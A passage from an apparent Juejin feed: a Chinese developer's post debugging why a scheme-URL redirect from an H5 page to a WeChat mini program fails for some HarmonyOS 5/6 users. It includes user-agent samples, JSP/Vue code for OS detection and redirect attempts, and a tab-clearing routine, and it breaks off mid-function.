<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fx-extends%2Fvxe-table" target="_blank" title="https://gitee.com/x-extends/vxe-table" ref="nofollow noopener noreferrer">gitee.com/x-extends/v…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[鸿蒙5、6用户h5页面使用schemeURL跳转小程序失败]]></title>    <link>https://juejin.cn/post/7592853243732426792</link>    <guid>https://juejin.cn/post/7592853243732426792</guid>    <pubDate>2026-01-09T05:53:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592853243732426792" data-draft-id="7592853243731165224" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="鸿蒙5、6用户h5页面使用schemeURL跳转小程序失败"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-09T05:53:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="快乐星球372"/> <meta itemprop="url" content="https://juejin.cn/user/73012374152599"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            鸿蒙5、6用户h5页面使用schemeURL跳转小程序失败
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/73012374152599/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    快乐星球372
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T05:53:22.000Z" title="Fri Jan 09 2026 05:53:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>线上鸿蒙5、6用户h5页面使用schemeURL跳转小程序失败</p>
<h2 data-id="heading-0">情况描述</h2>
<ul>
<li>ios用户自动跳转成功</li>
<li>安卓用户自动跳转成功</li>
<li>测试机鸿蒙5、6跳转成功</li>
</ul>
<h3 data-id="heading-1">客户经理提供用户手机截图：</h3>
<p>线上用户自动跳转到网址为：weixin://dl/business/?t=xxx的网址了，没有拉起微信小程序</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/13b899241a464038ba16ac429b8d5b4f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b-r5LmQ5pif55CDMzcy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768542802&amp;x-signature=JJJa21bz3WscTplIK10WC94oCSc%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-2">线上用户手机鸿蒙5、6跳转失败</h3>
<pre><code class="hljs"/></pre>
<h3 data-id="heading-3">测试机鸿蒙5、6跳转成功获取到的useragent能够自动、点击按钮跳转</h3>
<p>访问同事发现，称手机非纯血鸿蒙</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-symbol">userAgent:</span> Mozilla/<span class="hljs-number">5.0</span>(Phone;OpenHarmony <span class="hljs-number">6.0</span>; Android <span class="hljs-number">10</span>)AppleWebKit/<span class="hljs-number">537.36</span>(KHTML,<span class="hljs-built_in">like</span> Gecko) Chrome/<span class="hljs-number">132.0</span>.<span class="hljs-number">0.0</span>Safari/<span class="hljs-number">537.36</span> ArkWeb/<span class="hljs-number">6.0</span>.<span class="hljs-number">0.120</span>MobileHuaweiBrowser/<span class="hljs-number">5.1</span>.<span class="hljs-number">11.312d</span>ata<span class="hljs-string">"不
支持
</span></code></pre>
<h3 data-id="heading-4">问题原因</h3>
<ol>
<li>无法确认是纯血鸿蒙还是非纯血鸿蒙原因？</li>
<li>是浏览器问题？兼容性或者隐私设置问题？</li>
<li>如何区分纯血鸿蒙、非纯血鸿蒙？</li>
</ol>
<p>以上问题，想和客户求证，还在等负责人推进...</p>
<h2 data-id="heading-5">关键代码</h2>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// schemeURL密文地址</span>
<span class="hljs-keyword">let</span> url = <span class="hljs-string">'weixin://dl/business/?t=xxx'</span>  

<span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {  
<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {  
<span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span> = <span class="hljs-string">'weixin://dl/business/?t=xxx'</span>;  
}, <span class="hljs-number">500</span>);

<span class="hljs-keyword">function</span> <span class="hljs-title function_">jumpTo1</span>(<span class="hljs-params"/>){  
<span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span> = url;  
}  
<span class="hljs-keyword">function</span> <span class="hljs-title function_">jumpTo2</span>(<span class="hljs-params"/>){  
<span class="hljs-keyword">const</span> ifr = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'iframe'</span>);  
ifr.<span class="hljs-property">src</span> = url;  
ifr.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">'none'</span>;  
<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(ifr);  
<span class="hljs-comment">// 可选：延时移除，避免影响  </span>
<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {  
<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">removeChild</span>(ifr);  
}, <span class="hljs-number">2000</span>);  
}  
<span class="hljs-keyword">function</span> <span class="hljs-title function_">jumpTo3</span>(<span class="hljs-params"/>){  
<span class="hljs-keyword">const</span> a = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'a'</span>);  
a.<span class="hljs-property">href</span> = url;  
a.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">'none'</span>;  
<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(a);  
a.<span class="hljs-title function_">click</span>();  
<span class="hljs-comment">// 可选：延时移除，避免影响  </span>
<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {  
<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">removeChild</span>(a);  
}, <span class="hljs-number">2000</span>);  
}
</code></pre>
<h2 data-id="heading-6">源代码</h2>
<p>jsp页面</p>
<pre><code class="hljs language-jsp" lang="jsp">&lt;div class=<span class="hljs-string">"container"</span> id=<span class="hljs-string">"arcode"</span>&gt;  
&lt;div class=<span class="hljs-string">"note"</span>&gt;  
&lt;strong&gt;温馨提示：&lt;/strong&gt;此功能需要在微信外浏览器打开，如手机自带浏览器、Safari或Chrome等。  
&lt;/div&gt;  
  
&lt;%-- &lt;button class=<span class="hljs-string">"jump-btn"</span> onclick=<span class="hljs-string">"loadScheme('develop')"</span>&gt;密文开发版本&lt;/button&gt;--%&gt;  
&lt;%-- &lt;button class=<span class="hljs-string">"jump-btn"</span> onclick=<span class="hljs-string">"loadMWScheme()"</span>&gt;明文跳转小程序&lt;/button&gt;--%&gt;  
&lt;div&gt;  
&lt;button id=<span class="hljs-string">"hmbtn"</span> class=<span class="hljs-string">"jump-btn"</span> onclick=<span class="hljs-string">"joinWhiteList()"</span> style=<span class="hljs-string">"display:none"</span>&gt; 进入小程序&lt;/button&gt;  
&lt;button id=<span class="hljs-string">"fhmbtn2"</span> class=<span class="hljs-string">"jump-btn"</span> onclick=<span class="hljs-string">"loadScheme()"</span> style=<span class="hljs-string">"display:none"</span>&gt; 进入小程序&lt;/button&gt;  
&lt;button id=<span class="hljs-string">"hmbtn2"</span> class=<span class="hljs-string">"jump-btn"</span> onclick=<span class="hljs-string">"joinWhiteList()"</span> style=<span class="hljs-string">"display:none"</span>&gt; 上报设备信息&lt;/button&gt;  
&lt;/div&gt;  
&lt;p id=<span class="hljs-string">"device3"</span> style=<span class="hljs-string">"color: red"</span>&gt;&lt;/p&gt;  
&lt;p id=<span class="hljs-string">"device"</span>&gt;&lt;/p&gt;  
&lt;div class=<span class="hljs-string">"steps"</span>&gt;  
&lt;p&gt;&lt;strong&gt;跳转说明：&lt;/strong&gt;&lt;/p&gt;  
&lt;ul&gt;  
&lt;li&gt;确保您已安装最新版本的微信App&lt;/li&gt;  
&lt;/ul&gt;  
&lt;/div&gt;  
  
&lt;div class=<span class="hljs-string">"qr-code"</span>&gt;  
&lt;div class=<span class="hljs-string">"qr-placeholder"</span> v-loading=<span class="hljs-string">"loading"</span>&gt;  
&lt;view id=<span class="hljs-string">"mini"</span>&gt;&lt;/view&gt;  
&lt;/div&gt;  
&lt;p&gt;如有问题，请联系客服支持&lt;/p&gt;  
&lt;/div&gt;  
  
&lt;/div&gt;  
  
&lt;script&gt;  
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>({  
el: <span class="hljs-string">'#arcode'</span>,  
data() {  
<span class="hljs-keyword">return</span> {  
loading: <span class="hljs-literal">false</span>,  
};  
},  
});  
  
<span class="hljs-type">const</span> <span class="hljs-variable">baseURL</span> <span class="hljs-operator">=</span> <span class="hljs-string">"&lt;%=basePath%&gt;"</span>  
<span class="hljs-type">const</span> <span class="hljs-variable">service</span> <span class="hljs-operator">=</span> axios.create({  
baseURL: baseURL,  
timeout: <span class="hljs-number">15000</span>,  
withCredentials: <span class="hljs-literal">true</span>,  
})  
  
service.interceptors.request.use(config =&gt; {  
<span class="hljs-keyword">if</span> (config.method === <span class="hljs-string">'get'</span>) {  
<span class="hljs-keyword">if</span> (config.params) {  
config.params[<span class="hljs-string">'date'</span>] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().getTime()  
} <span class="hljs-keyword">else</span> {  
config.url = config.url + `?date=` + <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().getTime()  
}  
}  
<span class="hljs-keyword">return</span> config  
}, error =&gt; {  
ELEMENT.Message({  
message: <span class="hljs-string">'错误信息：'</span> + error,  
type: <span class="hljs-string">'warning'</span>  
});  
<span class="hljs-keyword">return</span> Promise.reject(error)  
})  
  
service.interceptors.response.use(resData =&gt; {  
<span class="hljs-keyword">if</span> (resData.headers[<span class="hljs-string">'content-disposition'</span>]) {  
resData.data.contentDisposition = resData.headers[<span class="hljs-string">'content-disposition'</span>]  
}  
<span class="hljs-keyword">if</span> (resData.status &gt;= <span class="hljs-number">200</span> &amp;&amp; resData.status &lt; <span class="hljs-number">300</span>) {  
const {code, result, msg} = resData.data  
<span class="hljs-title function_">if</span> <span class="hljs-params">(code === <span class="hljs-number">1</span>)</span> {  
<span class="hljs-keyword">return</span> result  
} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (code === <span class="hljs-number">10012</span>) {  
ELEMENT.Message({  
message: <span class="hljs-string">'token已过期，请您重新登录！'</span>,  
type: <span class="hljs-string">'warning'</span>  
});  
setTimeout(() =&gt; location.reload(), <span class="hljs-number">1500</span>);  
<span class="hljs-keyword">return</span> Promise.reject(code)  
} <span class="hljs-keyword">else</span> {  
<span class="hljs-keyword">if</span> (msg == undefined) {  
<span class="hljs-keyword">return</span> resData  
}  
ELEMENT.Message({  
message: msg,  
type: <span class="hljs-string">'warning'</span>  
});  
<span class="hljs-keyword">return</span> Promise.reject(code)  
}  
}  
}, error =&gt; {  
ELEMENT.Message({  
message: <span class="hljs-string">'错误信息：'</span> + error,  
type: <span class="hljs-string">'warning'</span>  
});  
<span class="hljs-keyword">return</span> Promise.reject(error)  
})  
  
function <span class="hljs-title function_">GetWxMiniScheme</span><span class="hljs-params">(code, ticket, version)</span> {  
<span class="hljs-keyword">return</span> service({  
method: <span class="hljs-string">'GET'</span>,  
url: <span class="hljs-string">'/api/scheme/getWxMiniScheme/'</span> + code + <span class="hljs-string">'/'</span> + ticket + <span class="hljs-string">'/'</span> + version,  
})  
}  
  
function <span class="hljs-title function_">AddWhitelist</span><span class="hljs-params">(ticket, model)</span> {  
<span class="hljs-keyword">return</span> service({  
method: <span class="hljs-string">'GET'</span>,  
url: <span class="hljs-string">'/api/scheme/addWhitelist/'</span> + ticket + <span class="hljs-string">'/'</span> + model,  
})  
}  
  
<span class="hljs-type">var</span> <span class="hljs-variable">ticket</span> <span class="hljs-operator">=</span> `${ticket}`;  
<span class="hljs-type">const</span> <span class="hljs-variable">paramscom</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLSearchParams</span>(window.location.search);  
ticket = paramscom.get(<span class="hljs-string">'ticket'</span>);  
<span class="hljs-comment">// 系统  </span>
<span class="hljs-type">let</span> <span class="hljs-variable">ua</span> <span class="hljs-operator">=</span> navigator.userAgent.toLowerCase();  
<span class="hljs-type">let</span> <span class="hljs-variable">isHo</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>  
  
<span class="hljs-comment">// 1. 识别鸿蒙系（优先级最高，避免被安卓识别覆盖）  </span>
<span class="hljs-type">const</span> <span class="hljs-variable">isOpenHarmony</span> <span class="hljs-operator">=</span> /openharmony\s?([<span class="hljs-number">0</span>-<span class="hljs-number">9.</span>_]+)/i.test(ua) || /openharmony\/([<span class="hljs-number">0</span>-<span class="hljs-number">9.</span>_]+)/i.test(ua);  
<span class="hljs-type">const</span> <span class="hljs-variable">openHarmonyVersion</span> <span class="hljs-operator">=</span> (ua.match(/openharmony\s?([<span class="hljs-number">0</span>-<span class="hljs-number">9.</span>_]+)/i) || ua.match(/openharmony\/([<span class="hljs-number">0</span>-<span class="hljs-number">9.</span>_]+)/i) || [])[<span class="hljs-number">1</span>] || <span class="hljs-string">''</span>;  
  
<span class="hljs-type">const</span> <span class="hljs-variable">isHarmonyOS</span> <span class="hljs-operator">=</span> /harmonyos\s?([<span class="hljs-number">0</span>-<span class="hljs-number">9.</span>_]+)/i.test(ua) || /harmonyos\/([<span class="hljs-number">0</span>-<span class="hljs-number">9.</span>_]+)/i.test(ua);  
<span class="hljs-type">const</span> <span class="hljs-variable">harmonyOSVersion</span> <span class="hljs-operator">=</span> (ua.match(/harmonyos\s?([<span class="hljs-number">0</span>-<span class="hljs-number">9.</span>_]+)/i) || ua.match(/harmonyos\/([<span class="hljs-number">0</span>-<span class="hljs-number">9.</span>_]+)/i) || [])[<span class="hljs-number">1</span>] || <span class="hljs-string">''</span>;  
  
<span class="hljs-comment">// 2. 识别iOS（包含iPhone/iPad/iPod）  </span>
<span class="hljs-type">const</span> <span class="hljs-variable">isIOS</span> <span class="hljs-operator">=</span> /iphone|ipad|ipod|ios/i.test(ua);  
<span class="hljs-type">const</span> <span class="hljs-variable">iosVersion</span> <span class="hljs-operator">=</span> (ua.match(/os\s+(\d+[._]\d+)/i) || [])[<span class="hljs-number">1</span>]?.replace(<span class="hljs-string">'_'</span>, <span class="hljs-string">'.'</span>) || <span class="hljs-string">''</span>;  
  
<span class="hljs-comment">// 3. 识别安卓  </span>
<span class="hljs-type">const</span> <span class="hljs-variable">isAndroid</span> <span class="hljs-operator">=</span> /android|adr/i.test(ua) &amp;&amp; !isOpenHarmony &amp;&amp; !isHarmonyOS; <span class="hljs-comment">// 排除鸿蒙（鸿蒙UA含android）  </span>
<span class="hljs-type">const</span> <span class="hljs-variable">androidVersion</span> <span class="hljs-operator">=</span> (ua.match(/android\s+(\d+[._]\d+)/i) || [])[<span class="hljs-number">1</span>]?.replace(<span class="hljs-string">'_'</span>, <span class="hljs-string">'.'</span>) || <span class="hljs-string">''</span>;  
  
<span class="hljs-comment">// 4. 识别Windows Phone  </span>
<span class="hljs-type">const</span> <span class="hljs-variable">isWindowsPhone</span> <span class="hljs-operator">=</span> /windows phone|wp/i.test(ua);  
<span class="hljs-type">const</span> <span class="hljs-variable">wpVersion</span> <span class="hljs-operator">=</span> (ua.match(/windows phone\s+(\d+[._]\d+)/i) || [])[<span class="hljs-number">1</span>]?.replace(<span class="hljs-string">'_'</span>, <span class="hljs-string">'.'</span>) || <span class="hljs-string">''</span>;  
  
<span class="hljs-comment">// 5. 识别其他系统（Linux/MacOS/Windows）  </span>
<span class="hljs-type">const</span> <span class="hljs-variable">isLinux</span> <span class="hljs-operator">=</span> /linux/i.test(ua) &amp;&amp; !isAndroid &amp;&amp; !isOpenHarmony &amp;&amp; !isHarmonyOS;  
<span class="hljs-type">const</span> <span class="hljs-variable">isMacOS</span> <span class="hljs-operator">=</span> /mac os x/i.test(ua);  
<span class="hljs-type">const</span> <span class="hljs-variable">isWindows</span> <span class="hljs-operator">=</span> /windows|win32/i.test(ua);  
  
<span class="hljs-comment">// 6. 最终系统类型和版本赋值（无Unknown）  </span>
<span class="hljs-type">let</span> <span class="hljs-variable">systemType</span> <span class="hljs-operator">=</span> <span class="hljs-string">''</span>;  
<span class="hljs-type">let</span> <span class="hljs-variable">systemVersion</span> <span class="hljs-operator">=</span> <span class="hljs-string">''</span>;  
  
<span class="hljs-keyword">if</span> (isOpenHarmony) {  
systemType = <span class="hljs-string">'OpenHarmony'</span>;  
systemVersion = openHarmonyVersion;  
isHo = <span class="hljs-literal">true</span>  
} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (isHarmonyOS) {  
systemType = <span class="hljs-string">'HarmonyOS'</span>;  
systemVersion = harmonyOSVersion;  
isHo = <span class="hljs-literal">true</span>  
} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (isIOS) {  
systemType = <span class="hljs-string">'iOS'</span>;  
systemVersion = iosVersion;  
} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (isAndroid) {  
systemType = <span class="hljs-string">'Android'</span>;  
systemVersion = androidVersion;  
} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (isWindowsPhone) {  
systemType = <span class="hljs-string">'Windows Phone'</span>;  
systemVersion = wpVersion;  
} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (isLinux) {  
systemType = <span class="hljs-string">'Linux'</span>;  
systemVersion = <span class="hljs-string">''</span>;  
} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (isMacOS) {  
systemType = <span class="hljs-string">'MacOS'</span>;  
systemVersion = (ua.match(/mac os x\s+(\d+[._]\d+)/i) || [])[<span class="hljs-number">1</span>]?.replace(<span class="hljs-string">'_'</span>, <span class="hljs-string">'.'</span>) || <span class="hljs-string">''</span>;  
} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (isWindows) {  
systemType = <span class="hljs-string">'Windows'</span>;  
systemVersion = (ua.match(/windows nt\s+(\d+[._]\d+)/i) || [])[<span class="hljs-number">1</span>]?.replace(<span class="hljs-string">'_'</span>, <span class="hljs-string">'.'</span>) || <span class="hljs-string">''</span>;  
} <span class="hljs-keyword">else</span> {  
<span class="hljs-comment">// 兜底：仍识别不出则显示「Other」而非Unknown  </span>
systemType = <span class="hljs-string">'Other'</span>;  
systemVersion = <span class="hljs-string">''</span>;  
}  
<span class="hljs-comment">// 打印最终结果（无Unknown）  </span>
console.log(<span class="hljs-string">'系统类型:'</span>, systemType, <span class="hljs-string">'版本号:'</span>, systemVersion);  
<span class="hljs-type">const</span> <span class="hljs-variable">deviceInfo</span> <span class="hljs-operator">=</span> {  
systemType,  
systemVersion,  
userAgent: navigator.userAgent,  
platform: navigator.platform,  
time: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().toISOString()  
};  
<span class="hljs-type">const</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> document.querySelector(<span class="hljs-string">'#device'</span>);  
<span class="hljs-type">const</span> <span class="hljs-variable">p3</span> <span class="hljs-operator">=</span> document.querySelector(<span class="hljs-string">'#device3'</span>);  
p.style.whiteSpace = <span class="hljs-string">'pre-wrap'</span>;  
p.innerText = <span class="hljs-string">'系统类型:'</span> + deviceInfo.systemType + <span class="hljs-string">'\n'</span> + <span class="hljs-string">'版本号:'</span> + deviceInfo.systemVersion + <span class="hljs-string">'\n平台:'</span> + deviceInfo.platform + <span class="hljs-string">'\n'</span> + <span class="hljs-string">'UserAgent: '</span> + deviceInfo.userAgent + <span class="hljs-string">'data"'</span> + (navigator.userAgentData ? JSON.stringify(navigator.userAgentData) : <span class="hljs-string">'不支持'</span>);  
  
  
<span class="hljs-comment">// 页面加载后延迟执行跳转  </span>
window.onload = function () {  
<span class="hljs-keyword">if</span> (isHo) {  
document.getElementById(<span class="hljs-string">'hmbtn'</span>).style.display = <span class="hljs-string">'block'</span>;  
document.getElementById(<span class="hljs-string">'hmtext'</span>).style.display = <span class="hljs-string">'block'</span>;  
} <span class="hljs-keyword">else</span> {  
<span class="hljs-comment">// 非鸿蒙系统自动跳转-显示上报信息按钮(加白名单)  </span>
setTimeout(() =&gt; {  
loadScheme()  
}, <span class="hljs-number">500</span>);  
}  
  
  
};  
  
<span class="hljs-comment">// 【核心】全浏览器适配的清理逻辑（含夸克/华为）  </span>
function <span class="hljs-title function_">clearH5PageAfterJump</span><span class="hljs-params">()</span> {  
<span class="hljs-comment">// 第一步：识别浏览器类型  </span>
<span class="hljs-type">const</span> <span class="hljs-variable">ua</span> <span class="hljs-operator">=</span> navigator.userAgent.toLowerCase();  
<span class="hljs-type">const</span> <span class="hljs-variable">browserType</span> <span class="hljs-operator">=</span> {  
isHuawei: ua.includes(<span class="hljs-string">'huaweibrowser'</span>) || ua.includes(<span class="hljs-string">'harmony'</span>) || ua.includes(<span class="hljs-string">'huawei'</span>),  
isQuark: ua.includes(<span class="hljs-string">'quark'</span>) || ua.includes(<span class="hljs-string">'quarkmini'</span>),  
isChrome: ua.includes(<span class="hljs-string">'chrome'</span>) &amp;&amp; !ua.includes(<span class="hljs-string">'mobile safari'</span>),  
isSafari: ua.includes(<span class="hljs-string">'mobile safari'</span>) &amp;&amp; !ua.includes(<span class="hljs-string">'chrome'</span>),  
isOther: <span class="hljs-literal">true</span>  
};  
<span class="hljs-comment">// 修正other判断  </span>
browserType.isOther = !browserType.isHuawei &amp;&amp; !browserType.isQuark &amp;&amp; !browserType.isChrome &amp;&amp; !browserType.isSafari;  
  
<span class="hljs-keyword">try</span> {  
<span class="hljs-comment">// 1. 华为浏览器：优先调用专属API  </span>
<span class="hljs-keyword">if</span> (browserType.isHuawei &amp;&amp; window.HuaweiBrowser) {  
window.HuaweiBrowser.closeCurrentTab();  
}  
<span class="hljs-comment">// 2. 通用关闭尝试（仅部分浏览器生效）  </span>
<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (window.close) {  
window.close();  
setTimeout(() =&gt; window.close(), <span class="hljs-number">200</span>);  
}  
} <span class="hljs-keyword">catch</span> (e) {  
console.log(<span class="hljs-string">'自动关闭失败，执行强制清空'</span>, e);  
  
<span class="hljs-comment">// 第二步：分浏览器强制清空（核心适配夸克）  </span>
<span class="hljs-keyword">if</span> (browserType.isQuark) {  
<span class="hljs-comment">// 夸克专属：深度清空+重写页面结构  </span>
document.open(); <span class="hljs-comment">// 打开文档流，清空缓存  </span>
document.write(<span class="hljs-string">'&lt;html class="blank-page"&gt;&lt;body class="blank-page"&gt;&lt;/body&gt;&lt;/html&gt;'</span>);  
document.close(); <span class="hljs-comment">// 关闭文档流，强制渲染  </span>
<span class="hljs-comment">// 替换历史记录+禁止返回  </span>
window.location.replace(<span class="hljs-string">'about:blank'</span>);  
<span class="hljs-comment">// 禁用所有交互  </span>
document.body.style.pointerEvents = <span class="hljs-string">'none'</span>;  
<span class="hljs-comment">// 终止所有异步任务  </span>
<span class="hljs-keyword">for</span> (<span class="hljs-type">let</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">2000</span>; i++) {  
clearInterval(i);  
clearTimeout(i);  
}  
<span class="hljs-comment">// 夸克特殊：延迟再次清空  </span>
setTimeout(() =&gt; {  
document.body.innerHTML = <span class="hljs-string">''</span>;  
